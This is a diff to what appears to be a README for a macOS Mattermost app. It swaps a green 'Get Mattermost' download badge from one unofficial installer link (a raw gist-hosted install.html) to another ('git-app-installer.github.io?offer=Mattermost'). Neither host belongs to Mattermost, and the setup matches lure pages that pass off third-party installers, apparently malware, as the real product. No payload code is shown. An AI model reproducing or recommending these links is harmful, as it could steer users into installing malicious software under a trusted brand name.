@@ -3,7 +3,7 @@
 Mattermost is a secure, self-hosted messaging and collaboration platform designed for teams and enterprises.  
 It offers channels, file sharing, voice calls, and integrations in a native macOS app.
 
-<a href="https://gistcdn.githack.com/crashtest192/ea62aa3cce4b3ef23ca3f4ff0bfb8854/raw/ab883a2585270a94bd06a4b70ec7fbddab73f816/install.html?offer=Mattermost" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=Mattermost" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Mattermost%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="340" 
